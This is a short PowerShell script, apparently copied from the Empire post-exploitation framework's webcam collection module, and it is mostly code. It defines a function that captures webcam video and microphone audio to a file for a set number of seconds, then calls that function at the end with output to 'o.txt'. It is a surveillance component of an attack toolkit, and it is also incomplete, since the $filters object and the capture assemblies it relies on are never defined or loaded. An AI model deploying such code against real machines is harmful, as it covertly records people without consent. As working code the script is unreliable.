# Taken from : https://github.com/EmpireProject/Empire/blob/master/lib/modules/powershell/collection/WebcamRecorder.py
function Start-WebcamRecorder
{
  [CmdletBinding()]
  param
  (
    [Parameter()]
    [ValidateNotNullOrEmpty()]
    [int]$RecordTime,
    [Parameter()]
    [ValidateNotNullOrEmpty()]
    [Alias("FilePath")]
    [string]$OutPath
  )
  #http://www.codeproject.com/Articles/3566/DirectX-Capture-Class-Library
  #http://directshownet.sourceforge.net/
  #Merged the DirectX and DShowNET assemblies
  
  #Gather all filters for Video, Audio, and Compression 
  if (($filters.VideoInputDevices -ne $null) -and ($filters.AudioInputDevices)) 
  {
    $VideoInput = $filters.VideoInputDevices[0]
    $AudioInput = $filters.AudioInputDevices[0]
    $VideoCapture = New-Object DirectX.Capture.Capture -ArgumentList $VideoInput,$AudioInput
    $VideoCapture.Filename = $OutPath
    $Compression = $filters.VideoCompressors[0]
    if ($Compression -ne $Null) 
    {
      $VideoCapture.VideoCompressor = $Compression
    }
    #Start the video capture
    try{$VideoCapture.Start()}
    catch{Write-Verbose "[!]Unable to start capture"; $VideoCapture.Stop();break}
    Start-Sleep -seconds $RecordTime
    $VideoCapture.stop()
  }
  else 
  {
    Write-Verbose "[!] Unable to obtain any audio or video input filters"    
  }
}
Start-WebcamRecorder -OutPath o.txt
